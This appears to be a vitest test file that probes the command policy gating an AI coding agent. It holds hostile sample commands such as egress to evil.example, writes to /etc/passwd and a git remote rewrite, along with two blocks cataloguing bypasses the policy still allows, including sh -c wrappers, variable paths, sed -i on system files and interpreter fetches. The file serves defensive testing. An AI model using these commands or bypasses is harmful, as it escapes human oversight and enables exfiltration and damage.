/**
 * The policy under attack, not under description (docs/design.md D11, D15).
 *
 * `policy.test.ts` is the table the design promises: one row per refusal, one row per allow. This
 * file asks the opposite question — where is the policy *wrong*? Three kinds of row, and the label
 * of each says which kind it is:
 *
 * - **Correct refusals that a naive text check would miss** (quoting, flag games, line
 *   continuations, prefix attacks, userinfo confusion). These are the rows that would fail if
 *   someone "simplified" the tokenizer or the refspec parser.
 * - **False positives**: the policy refuses something a session legitimately needs. A refusal that
 *   fires on an ordinary command is the failure mode that does not announce itself, so each of
 *   these is asserted as a refusal *and* named `(false positive)`.
 * - **Holes**: a call that escapes a rule D11 says is always blocked. Where the module's own
 *   docstring already names the class (`eval`, a variable, a script, a symlink, a named remote),
 *   the row is `(documented hole)`. Where it does not, the row is `(reported hole)` and asserts
 *   today's behaviour on purpose: the day the hole is closed, this row fails, and whoever closes it
 *   moves the row up into the refusal list. See
 *   `.pi/skills/verify-policy/features/refusals.md` — "What it does not prove" — for the same list
 *   in prose.
 *
 * Pure and offline: no harness, no database, no model, no network.
 */
import type { JsonObject, ToolCall } from "@earendil-works/pi-ai";
import { describe, expect, it } from "vitest";
import { autonomyRules, DEFAULT_AUTONOMY, decideToolCall } from "./policy";

/** A session whose worktree is `/work/ses_1`. */
const rules = autonomyRules(DEFAULT_AUTONOMY, "/work/ses_1");

const call = (name: string, args: JsonObject): ToolCall => ({
  type: "toolCall",
  id: "call-1",
  name,
  arguments: args,
});

const bash = (command: string): ToolCall => call("bash", { command });
const write = (path: string): ToolCall => call("write", { path, content: "x" });

const decision = (toolCall: ToolCall) => decideToolCall(rules, toolCall);

/** The refusal for a call, or a failure naming the call that was allowed. */
const refusal = (toolCall: ToolCall): string => {
  const settled = decision(toolCall);
  if (settled._tag === "allow") {
    throw new Error(`expected a refusal for ${JSON.stringify(toolCall)}`);
  }
  return settled.reason;
};

const allowed = (toolCall: ToolCall): void => {
  expect(decision(toolCall)).toEqual({ _tag: "allow" });
};

describe("refusals a naive text check would miss", () => {
  it.each([
    // Force, in every spelling the flag can take.
    [
      "a lease-based force-push without =",
      bash("git push --force-with-lease origin refs/heads/factory/ses_1"),
      "--force-with-lease is refused",
    ],
    [
      "a lease-based force-push with =",
      bash(
        "git push --force-with-lease=refs/heads/factory/ses_1 origin refs/heads/factory/ses_1",
      ),
      "--force-with-lease is refused",
    ],
    [
      "a lease with an empty value",
      bash("git push --force-with-lease= origin refs/heads/factory/ses_1"),
      "--force-with-lease is refused",
    ],
    [
      "a force flag after the refspec",
      bash("git push origin main --force"),
      "--force is refused",
    ],
    [
      "a force flag among other short flags",
      bash("git push -n -f origin main"),
      "-f is refused",
    ],
    // The destination, in every spelling.
    [
      "main as both sides of the refspec",
      bash("git push origin main:main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a factory source with a main destination",
      bash("git push origin refs/heads/factory/a:refs/heads/main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "HEAD pushed into main",
      bash("git push origin HEAD:main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a dry run does not make a push safe",
      bash("git push --dry-run origin main"),
      "pushing refs/heads/main is refused",
    ],
    // The git global flags that put the subcommand one word further along.
    [
      "a push behind git -c",
      bash("git -c a=b push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push behind git --no-pager",
      bash("git --no-pager push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push behind git --git-dir=",
      bash("git --git-dir=/tmp/x push origin main"),
      "pushing refs/heads/main is refused",
    ],
    // The wrappers, including the one that takes a value.
    [
      "a push behind sudo -u",
      bash("sudo -u root git push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push behind env with an assignment",
      bash("env FOO=1 git push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push behind a bare assignment",
      bash("FOO=1 git push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push behind env -i",
      bash("env -i git push origin main"),
      "pushing refs/heads/main is refused",
    ],
    // The separators, including the ones a person does not type by hand.
    [
      "a push on the second line",
      bash("bun run test\ngit push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push after a CR",
      bash("echo a\r\ngit push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push after a tab-separated command",
      bash("git\tpush\torigin\tmain"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push after a leading space",
      bash("   git push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push with a trailing space",
      bash("git push origin main   "),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push behind a comment line",
      bash("# push now\ngit push origin main"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push with the refspec named twice",
      bash("git push origin refs/heads/factory/a:refs/heads/main"),
      "pushing refs/heads/main is refused",
    ],
    // Deletion, in every spelling.
    [
      "a deletion of a tag ref",
      bash("git push origin :refs/tags/v1"),
      "deleting a ref loses",
    ],
    [
      "a truncating refspec",
      bash("git push origin main:"),
      "deleting a ref loses",
    ],
    [
      "a colon with nothing beside it",
      bash("git push origin :"),
      "deleting a ref loses",
    ],
    [
      "a leading + with an uppercase ref",
      bash("git push origin +HEAD:refs/heads/factory/a"),
      "a leading + forces the update",
    ],
    [
      "a factory source pushed to a destination that is not a factory ref",
      bash("git push origin refs/heads/factory/a:b"),
      "pushing refs/heads/b is refused",
    ],
    // Tag pushes by ref, and by the flag.
    [
      "a tag as a destination",
      bash("git push origin HEAD:refs/tags/v1"),
      "may only push refs/heads/factory/**",
    ],
    // Egress: the confusions a host allowlist usually loses to.
    [
      "a proxy naming a host nobody allowlisted",
      bash("curl --proxy evil.example:8080 https://github.com/x"),
      "network egress to evil.example",
    ],
    [
      "userinfo that names the allowlisted host",
      bash("curl https://github.com@evil.example/x"),
      "network egress to evil.example",
    ],
    [
      "a subdomain that ends in the allowlisted host",
      bash("curl https://github.com.evil.example/x"),
      "network egress to github.com.evil.example",
    ],
    [
      "an IPv4 literal",
      bash("curl http://93.184.216.34/x"),
      "network egress to 93.184.216.34",
    ],
    [
      "an IPv6 literal",
      bash("curl http://[2606:2800:220:1::1]/x"),
      "network egress to [2606:2800:220:1::1]",
    ],
    [
      "an uppercase host",
      bash("curl https://EVIL.EXAMPLE/x"),
      "network egress to evil.example",
    ],
    [
      "an ssh URL handed to git fetch",
      bash("git fetch ssh://git@evil.example/x.git"),
      "network egress to evil.example",
    ],
    [
      "an scp-style URL handed to git pull",
      bash("git pull git@evil.example:x/y.git"),
      "network egress to evil.example",
    ],
    // Writes: the redirect shapes that are not a bare `>`.
    [
      "a redirect inside a subshell",
      bash("(echo x) > /etc/x"),
      "redirecting output to /etc/x is refused",
    ],
    [
      "a redirect from a file descriptor",
      bash("exec 3> /etc/x"),
      "redirecting output to /etc/x is refused",
    ],
    [
      "a redirect into cat",
      bash("cat > /etc/x"),
      "redirecting output to /etc/x is refused",
    ],
    [
      "a redirect after a line continuation",
      bash("printf x \\\n> /etc/x"),
      "redirecting output to /etc/x is refused",
    ],
    [
      "an append through tee",
      bash("echo x | tee --append /etc/x"),
      "tee writing /etc/x is refused",
    ],
    [
      "a write by install",
      bash("install -m 644 a.txt /tmp/b.txt"),
      "install writing /tmp/b.txt is refused",
    ],
    [
      "a truncation",
      bash("truncate -s 0 /etc/x"),
      "truncate writing /etc/x is refused",
    ],
    ["a shred", bash("shred /etc/x"), "shred writing /etc/x is refused"],
    // Paths: the containment checks that are easy to get wrong.
    [
      "a worktree path that is only a string prefix of the target",
      write("/work/ses_1evil/x"),
      "may only write inside its worktree",
    ],
    [
      "a path that leaves the worktree and re-enters a sibling",
      write("/work/ses_1/../other/x"),
      "may only write inside its worktree",
    ],
    [
      "the worktree's parent",
      write(".."),
      "may only write inside its worktree",
    ],
    ["the agent's home itself", write("~"), "it names a home directory"],
    ["another user's home", write("~root/x"), "it names a home directory"],
    [
      "a trailing slash on an outside path",
      bash("mkdir /tmp/x/"),
      "mkdir writing /tmp/x/ is refused",
    ],
    [
      "a quoted path with a space, outside",
      bash('echo x > "/tmp/a b.txt"'),
      "redirecting output to /tmp/a b.txt is refused",
    ],
    [
      "a glob that would expand outside",
      bash("echo x > /etc/*"),
      "redirecting output to /etc/* is refused",
    ],
    [
      "a path that only escapes after .. resolution",
      bash("rm /tmp/../etc/passwd"),
      "rm writing /tmp/../etc/passwd is refused",
    ],
  ])("%s", (_label, toolCall, fragment) => {
    expect(refusal(toolCall)).toContain(fragment);
  });
});

describe("false positives a first pass had, now allowed", () => {
  // The first pass scanned every argument of an egress command for a host, so `curl -o out.json
  // https://github.com/x` was refused as "network egress to out.json". A policy that refuses the
  // ordinary way to download a file is a policy that gets removed, so the flag values are read
  // now, and `scp`/`rsync` are judged by their destination rather than by the file they copy.
  it.each([
    [
      "an output file whose name looks like a hostname",
      bash("curl -sS -o out.json https://github.com/x"),
    ],
    [
      "a request body file",
      bash("curl -d @body.json https://api.github.com/repos"),
    ],
    [
      "an output file for wget",
      bash("wget -O index.html https://github.com/x"),
    ],
    [
      "a header plus an output file",
      bash(
        "curl -H 'Accept: application/json' -o page.html https://github.com/x",
      ),
    ],
    [
      "the file being copied, which is not a host",
      bash("scp f.txt sandbox:/tmp/f"),
    ],
  ])("%s", (_label, toolCall) => {
    allowed(toolCall);
  });

  it("still refuses a destination that is a host nobody allowlisted", () => {
    expect(refusal(bash("curl -o out.json https://evil.example/x"))).toContain(
      "network egress to evil.example",
    );
    expect(refusal(bash("scp f.txt git@evil.example:/tmp/f"))).toContain(
      "network egress to evil.example",
    );
  });
});

describe("refusals that cost a round trip (conservative, not a bypass)", () => {
  it.each([
    [
      "a push of HEAD, which names the session's own branch",
      bash("git push origin HEAD"),
      "pushing refs/heads/HEAD is refused",
    ],
    [
      "a push of the upstream shorthand, which git itself rejects",
      bash("git push origin '@{u}'"),
      "pushing refs/heads/@{u} is refused",
    ],
  ])("%s", (_label, toolCall, fragment) => {
    expect(refusal(toolCall)).toContain(fragment);
  });

  it("reads the destination of a HEAD push as the ref name HEAD", () => {
    // Why the row above cannot be fixed by parsing: `HEAD` is not a ref prefix at all, so the
    // policy refuses rather than resolving the branch the worktree is on (that needs the repo).
    // `git push --dry-run --porcelain origin HEAD` against a local remote reports
    // `HEAD:refs/heads/<current branch>`, so for a session on `factory/<id>` this refusal is a
    // round trip the agent has to spend, not a boundary doing its job.
    expect(refusal(bash("git push origin HEAD"))).toContain(
      "this session may only push refs/heads/factory/",
    );
  });
});

describe("holes the module's own docstring names (documented bypasses)", () => {
  it.each([
    ["a command inside sh -c", bash("sh -c 'git push origin main'")],
    ["a command inside bash -c", bash("bash -c 'git push origin main'")],
    ["a command run by xargs", bash("echo x | xargs git push origin main")],
    ["a path held in a variable", bash("OUT=/etc/passwd; echo pwned > $OUT")],
    [
      "a path held in a variable on its own line",
      bash("OUT=/etc/passwd\necho pwned > $OUT"),
    ],
    [
      "a read through a symlink placed inside the worktree",
      bash("ln -s /etc/passwd notes.txt"),
    ],
  ])("%s", (_label, toolCall) => {
    allowed(toolCall);
  });

  it("allows a push to a named remote without resolving where that remote is", () => {
    // The module's docstring: "a push to a *named* remote is judged by its refspec, not by the
    // remote's host: resolving a remote name to a URL means reading git config". True of a name.
    // The rows in the next block are the ones it does not cover: a URL, written out.
    allowed(bash("git push origin refs/heads/factory/ses_1"));
  });
});

describe("holes a first pass left, now refused", () => {
  // These rows were holes the first pass reported rather than fixed; they are refusals now, and each
  // one is a call that escaped a rule D11 states as "always blocked".

  it.each([
    [
      "a force-push with combined short flags",
      bash("git push -uf origin refs/heads/factory/ses_1"),
      "git push -uf is refused",
    ],
    [
      "a force-push with the short flags combined the other way",
      bash("git push -fu origin refs/heads/factory/ses_1"),
      "git push -fu is refused",
    ],
    [
      "an abbreviated force option",
      bash("git push --force-w origin refs/heads/factory/ses_1"),
      "is refused",
    ],
    [
      "a force-push with combined short flags behind a wrapper",
      bash("sudo -u root env git push -uf origin refs/heads/factory/ses_1"),
      "is refused",
    ],
    [
      "a write into the working directory a previous cd selected",
      bash("cd /tmp && echo pwned > escaped.txt"),
      "cd /tmp is refused",
    ],
    [
      "a removal relative to a cd outside the worktree",
      bash("cd /tmp && rm -rf something"),
      "cd /tmp is refused",
    ],
    [
      "a directory created in a cd'd home",
      bash("cd $HOME && mkdir x"),
      "is refused",
    ],
    [
      "the same inside a subshell",
      bash("(cd /etc && echo pwned > shadow)"),
      "cd /etc is refused",
    ],
    [
      "the same after pushd",
      bash("pushd /etc && echo pwned > shadow"),
      "pushd /etc is refused",
    ],
    // A substitution or subshell *runs* what is inside it, so the contents are commands the
    // policy sees once the unquoted parentheses and backticks are segment boundaries.
    [
      "a command in backticks",
      bash("echo `git push origin main`"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a command in a substitution",
      bash("echo $(git push origin main)"),
      "pushing refs/heads/main is refused",
    ],
    [
      "a push to a URL remote",
      bash("git push git@evil.example:x/y.git refs/heads/factory/ses_1"),
      "network egress to evil.example",
    ],
    [
      "a push to an https URL remote",
      bash("git push https://evil.example/x.git refs/heads/factory/ses_1"),
      "network egress to evil.example",
    ],
    [
      "a push to a URL given as --repo",
      bash(
        "git push --repo=https://evil.example/x origin refs/heads/factory/ses_1",
      ),
      "network egress to evil.example",
    ],
    [
      "changing the remote through git config",
      bash("git config remote.origin.url https://evil.example/x"),
      "git config remote.origin.url is refused",
    ],
    [
      "an insteadOf rewrite, which changes what a name resolves to",
      bash(
        "git config --local url.https://evil.example/.insteadOf https://github.com/",
      ),
      "is refused",
    ],
  ])("%s", (_label, toolCall, fragment) => {
    expect(refusal(toolCall)).toContain(fragment);
  });

  it("reads the remote's host when the command writes the URL out", () => {
    // The two rows differ only in how the destination is written. A *name* is still not resolved
    // (that needs git config, LOB-51); a URL in the command is checked.
    allowed(bash("git push origin refs/heads/factory/ses_1"));
    expect(
      refusal(
        bash("git push https://evil.example/x.git refs/heads/factory/ses_1"),
      ),
    ).toContain("network egress to evil.example");
  });
});

describe("holes the docs still name (reported, not fixed here)", () => {
  // Each row asserts what the policy does today, deliberately: a call that escapes a rule D11
  // states as "always blocked", reported rather than fixed so widening the boundary stays a
  // deliberate act. Every one is named in `.pi/skills/verify-policy/features/refusals.md`.

  it.each([
    // A remote given as a local path has no host to check.
    [
      "a push into another local repository",
      bash("git push /tmp/other.git refs/heads/factory/ses_1"),
    ],
    // Writes by a command the write table does not hold, and rsync, which is in the egress list
    // instead.
    [
      "an in-place edit outside the worktree",
      bash("sed -i s/a/b/ /etc/passwd"),
    ],
    [
      "an archive extracted outside the worktree",
      bash("tar -xf a.tar -C /etc"),
    ],
    ["a zip extracted outside the worktree", bash("unzip a.zip -d /etc")],
    [
      "an rsync that writes outside the worktree",
      bash("rsync -a ./src/ /etc/dst/"),
    ],
    // Egress by a program that is not in the egress list.
    ["a publish, which is egress", bash("npm publish --access public")],
    [
      "a fetch from inside an interpreter",
      bash("node -e 'fetch(\"https://evil.example\")'"),
    ],
    // Hosts the host regex does not see.
    ["a single-label host", bash("ssh sandbox")],
    ["the same as an scp destination", bash("scp -r ./dir sandbox:/tmp/dir")],
    [
      "a fully qualified host with a trailing dot",
      bash("curl https://evil.example./x"),
    ],
    // A write the program performs itself, so no redirect and none of the write commands is
    // involved: curl's own `-o` is what creates the file.
    [
      "an output file written by curl's own flag",
      bash("curl -o /tmp/out.json https://github.com/x"),
    ],
    // A path in a variable is a value the policy cannot see through.
    ["a path held in a variable", bash("OUT=/etc/passwd; echo pwned > $OUT")],
  ])("%s", (_label, toolCall) => {
    allowed(toolCall);
  });
});

describe("the ordinary commands the refusals must not swallow", () => {
  it.each([
    [
      "a redirect of both streams to /dev/null",
      bash("echo a > /dev/null 2>&1"),
    ],
    ["a merged stream into a pipe", bash("bun run test 2>&1 | tail -5")],
    [
      "a relative directory outside the worktree's root but inside it",
      bash("mkdir -p a/b"),
    ],
    ["a push to the allowlisted host", bash("wget https://github.com/x")],
    [
      "two factory refs in one push",
      bash("git push origin refs/heads/factory/a refs/heads/factory/b"),
    ],
    [
      "a quoted factory refspec",
      bash("git push origin 'refs/heads/factory/a'"),
    ],
    [
      "the text of a push, quoted, which is not a push",
      bash("echo 'git push origin main'"),
    ],
    [
      "a redirect that is quoted, which is not a redirect",
      bash('echo "a > /etc/x"'),
    ],
    ["a heredoc body", bash("cat > notes.txt <<EOF\nline\nEOF")],
    [
      "a chained command where only the second writes, inside",
      bash("cd . && echo x > notes.txt"),
    ],
    [
      "a copy whose destination is inside",
      bash("cp /etc/hosts /tmp/../work/ses_1/notes.txt"),
    ],
    ["a dd onto a character device", bash("dd if=/dev/zero of=/dev/null")],
    ["a dd writing a relative file", bash("dd if=/dev/zero of=out.bin")],
    ["an append inside the worktree", bash("echo x >> notes.txt")],
    ["a trailing slash on the worktree itself", write("/work/ses_1/")],
    ["the worktree's own path", write("/work/ses_1")],
    ["a dot path", write(".")],
    ["a leading ./", write("./notes.txt")],
    ["a rename whose destination is inside", bash("mv a.txt b.txt")],
    ["a modification time inside", bash("touch -d 2020-01-01 notes.txt")],
    [
      "a git command that is not in the blocking set",
      bash("git worktree list"),
    ],
    ["a git tag listing", bash("git tag --list")],
    [
      "an allowlisted host in an uppercase spelling",
      bash("curl https://GitHub.com/x"),
    ],
    [
      "loopback, which is not egress",
      bash("curl http://127.0.0.1:9000/health"),
    ],
    ["a localhost subdomain", bash("curl http://api.localhost:9000/x")],
    [
      "a git command with an argument that looks like a host but is not egress",
      bash("git log --oneline -- path/to/file.md"),
    ],
  ])("%s", (_label, toolCall) => {
    allowed(toolCall);
  });
});
